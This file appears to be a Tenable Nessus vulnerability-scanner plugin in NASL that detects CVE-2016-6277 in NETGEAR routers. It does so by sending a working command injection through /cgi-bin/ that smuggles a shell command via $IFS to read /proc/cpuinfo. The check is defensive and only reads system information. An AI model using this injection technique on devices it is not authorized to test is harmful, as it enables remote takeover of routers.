#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(95823);
  script_version("$Revision: 1.5 $");
  script_cvs_date("$Date: 2017/05/22 13:59:29 $");

  script_cve_id("CVE-2016-6277");
  script_osvdb_id(148418);
  script_xref(name:"CERT", value:"582384");
  script_xref(name:"EDB-ID", value:"40889");

  script_name(english:"NETGEAR Multiple Model cgi-bin RCE");
  script_summary(english:"Attempts to execute a command on the remote device.");

  script_set_attribute(attribute:"synopsis", value:
"The remote router is affected by a remote command execution
vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote NETGEAR router is affected by a remote command execution
vulnerability due to improper sanitization of user-supplied input
passed via /cgi-bin/. An unauthenticated, remote attacker can exploit
this, via a specially crafted URL, to execute arbitrary commands on
the device.

Note that Nessus has detected this vulnerability by reading the
contents of file /proc/cpuinfo.");
  script_set_attribute(attribute:"see_also", value:"http://kb.netgear.com/000036386/CVE-2016-582384");
  script_set_attribute(attribute:"solution", value:
"Apply the latest available firmware update according to the vendor
advisory.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:F/RL:U/RC:X");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Netgear R7000 and R6400 cgi-bin Command Injection');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date",value:"2016/12/08");
  script_set_attribute(attribute:"patch_publication_date",value:"2017/02/08");
  script_set_attribute(attribute:"plugin_publication_date", value:"2016/12/14");

  script_set_attribute(attribute:"plugin_type",value:"remote");
  script_set_attribute(attribute:"cpe",value:"cpe:/o:netgear:d6220_firmware");
  script_set_attribute(attribute:"cpe",value:"cpe:/o:netgear:d6400_firmware");
  script_set_attribute(attribute:"cpe",value:"cpe:/o:netgear:r6250_firmware");
  script_set_attribute(attribute:"cpe",value:"cpe:/o:netgear:r6400_firmware");
  script_set_attribute(attribute:"cpe",value:"cpe:/o:netgear:r6700_firmware");
  script_set_attribute(attribute:"cpe",value:"cpe:/o:netgear:r6900_firmware");
  script_set_attribute(attribute:"cpe",value:"cpe:/o:netgear:r7000_firmware");
  script_set_attribute(attribute:"cpe",value:"cpe:/o:netgear:r7100lg_firmware");
  script_set_attribute(attribute:"cpe",value:"cpe:/o:netgear:r7300dst_firmware");
  script_set_attribute(attribute:"cpe",value:"cpe:/o:netgear:r7900_firmware");
  script_set_attribute(attribute:"cpe",value:"cpe:/o:netgear:r8000_firmware");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2016-2017 Tenable Network Security, Inc.");

  script_dependencies("netgear_www_detect.nbin");
  script_require_keys("installed_sw/Netgear WWW");
  script_require_ports("Services/www", 80, 443);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("install_func.inc");
include("misc_func.inc");
include("http.inc");

get_install_count(app_name:"Netgear WWW", exit_if_zero:TRUE);
port = get_http_port(default:80, embedded:TRUE);
install = get_single_install(app_name:"Netgear WWW", port:port);

exploit = "/cgi-bin/;cd$IFS'proc';cat$IFS'cpuinfo'";
res = http_send_recv3(
  method       : "GET",
  item         : exploit,
  port         : port,
  exit_on_fail : TRUE
);

res[2] = tolower(res[2]);

if (
  "bogomips" >< res[2] &&
  "processor" >< res[2]
)
{
  output = chomp(res[2]);

  # just in case, res[2] should have command output only
  if("</html>" >< output)
    output = chomp(substr(output, stridx(output,"</html>")+strlen("</html>")));

  output = ereg_replace(string: output, pattern: "^[ \t\r\n]*", replace: "");

  if (empty_or_null(output)) output = res[2];

  security_report_v4(
    port        : port,
    severity    : SECURITY_HOLE,
    generic     : TRUE,
    cmd         : "cd proc; cat cpuinfo",
    request     : make_list(build_url(qs:exploit)),
    output      : output
  );
  exit(0);
}
else audit(AUDIT_HOST_NOT, "an affected NETGEAR device");

